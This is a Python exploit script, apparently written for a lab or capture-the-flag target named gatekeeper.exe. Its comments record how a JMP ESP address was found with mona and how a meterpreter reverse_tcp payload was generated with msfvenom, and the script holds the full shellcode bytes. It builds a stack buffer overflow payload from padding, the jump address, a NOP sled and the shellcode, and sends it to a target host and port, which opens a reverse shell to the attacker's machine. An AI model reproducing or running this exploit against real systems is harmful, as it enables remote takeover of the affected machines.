#06-20-2020 DC:  This is a client, not a server.  
#06-20-2020 DC:  This f.py script will send an actual jmp aned a payload.

#The jmp was found with !mona jump -r esp -m gatekeeper.exe and it was 080414c3, so I'll convert to
#little-endian as follows:  jmp = "\xc3\x14\x04\x08"

#  07-13-2020 DC:  As for the shellcode, I will generate it with msfvenom as follows:
#  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00\x0A"

#!/usr/bin/python
 
import socket

target_host = "10.0.2.7"
target_port = 31337
jmp = "\xc3\x14\x04\x08"

shellcode = (
"\xbb\x9c\x71\xa7\xed\xdd\xc0\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x5b\x31\x5a\x14\x83\xea\xfc\x03\x5a\x10\x7e\x84\x5b\x05\xfc"
"\x67\xa4\xd6\x60\xe1\x41\xe7\xa0\x95\x02\x58\x10\xdd\x47\x55"
"\xdb\xb3\x73\xee\xa9\x1b\x73\x47\x07\x7a\xba\x58\x3b\xbe\xdd"
"\xda\x41\x93\x3d\xe2\x8a\xe6\x3c\x23\xf6\x0b\x6c\xfc\x7d\xb9"
"\x81\x89\xcb\x02\x29\xc1\xda\x02\xce\x92\xdd\x23\x41\xa8\x84"
"\xe3\x63\x7d\xbd\xad\x7b\x62\xfb\x64\xf7\x50\x70\x77\xd1\xa8"
"\x79\xd4\x1c\x05\x88\x24\x58\xa2\x72\x53\x90\xd0\x0f\x64\x67"
"\xaa\xcb\xe1\x7c\x0c\x98\x52\x59\xac\x4d\x04\x2a\xa2\x3a\x42"
"\x74\xa7\xbd\x87\x0e\xd3\x36\x26\xc1\x55\x0c\x0d\xc5\x3e\xd7"
"\x2c\x5c\x9b\xb6\x51\xbe\x44\x67\xf4\xb4\x69\x7c\x85\x96\xe5"
"\xb1\xa4\x28\xf6\xdd\xbf\x5b\xc4\x42\x14\xf4\x64\x0b\xb2\x03"
"\xfc\x1b\x45\xdb\x46\x4b\xbb\xdc\xb6\x42\x78\x88\xe6\xfc\xa9"
"\xb1\x6c\xfc\x56\x64\x18\xf6\xc0\x8d\xdd\x04\x1e\xfa\xdf\x08"
"\x31\xa6\x56\xee\x61\x06\x39\xbe\xc1\xf6\xf9\x6e\xaa\x1c\xf6"
"\x51\xca\x1e\xdc\xfa\x61\xf1\x89\x53\x1e\x68\x90\x2f\xbf\x75"
"\x0e\x4a\xff\xfe\xbb\xab\x4e\xf7\xce\xbf\xa7\x60\x31\x3f\x38"
"\x05\x31\x55\x3c\x8f\x66\xc1\x3e\xf6\x41\x4e\xc0\xdd\xd1\x88"
"\x3e\xa0\xe3\xe3\x09\x36\x4c\x9b\x75\xd6\x4c\x5b\x20\xbc\x4c"
"\x33\x94\xe4\x1e\x26\xdb\x30\x33\xfb\x4e\xbb\x62\xa8\xd9\xd3"
"\x88\x97\x2e\x7c\x72\xf2\x2c\x7b\x8c\x81\x1a\x24\xe5\x79\x1b"
"\xd4\xf5\x13\x9b\x84\x9d\xe8\xb4\x2b\x6e\x11\x1f\x64\xe6\x98"
"\xce\xc6\x97\x9d\xda\x87\x09\x9e\xe9\x13\xb9\xe5\x82\xa4\x3a"
"\x1a\x8b\xc0\x3a\x1b\xb3\xf6\x07\xca\x8a\x8c\x46\xcf\xa8\x8f"
"\x54\xe5\xc4\x27\xc1\x6c\x65\x2a\xf2\x5b\xaa\x53\x71\x69\x53"
"\xa0\x69\x18\x56\xec\x2d\xf1\x2a\x7d\xd8\xf5\x99\x7e\xc9")

nops = "\x90" * 15



payload = "A" * 142 + jmp + nops + shellcode

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_host,target_port))

client.send("GET / HTTP/1.0\r\nHOST: 10.0.2.7\r\n\r\n")
client.send("220 " + payload + "\r\n")

response = client.recv(4096)
